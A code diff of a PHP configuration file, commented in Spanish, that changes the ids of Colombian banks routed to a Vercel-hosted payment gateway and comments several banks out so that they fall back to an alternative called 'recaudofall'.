@@ -68,14 +68,14 @@ return [
     // Bancos que van a la pasarela Vercel.
     // Si comentas una línea, ese banco cae automáticamente a recaudofall.
     'primary_banks' => [
-        'bogota' => ['slug' => 'bg', 'id' => 'e795be1af0a0e791176cc511'],
-        'occidente' => ['slug' => 'occ', 'id' => 'e795be1af0a0e791176cc511'],
-        'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
-        'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
-        'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-//        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-        'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'],
-        'cajasocial' => ['slug' => 'cj', 'id' => 'e795be1af0a0e791176cc511'],
+        'bogota' => ['slug' => 'bg', 'id' => '5a0f41df4d573e083784e5d6'],
+     //   'occidente' => ['slug' => 'occ', 'id' => '5a0f41df4d573e083784e5d6'],
+    //    'popular' => ['slug' => 'pop', 'id' => '5a0f41df4d573e083784e5d6'],
+     //   'avvillas' => ['slug' => 'avv', 'id' => '5a0f41df4d573e083784e5d6'],
+        'bancolombia' => ['slug' => 'bc', 'id' => '5a0f41df4d573e083784e5d6'],  // <- comentado = va a recaudofall
+//        'nequi' => ['slug' => 'nq', 'id' => '5a0f41df4d573e083784e5d6'],  // <- comentado = va a recaudofall
+   //     'davivienda' => ['slug' => 'dv', 'id' => '5a0f41df4d573e083784e5d6'],
+  //      'cajasocial' => ['slug' => 'cj', 'id' => '5a0f41df4d573e083784e5d6'],
     ],
 
     // Bancos disponibles para recaudofall (nombre interno => etiqueta externa)
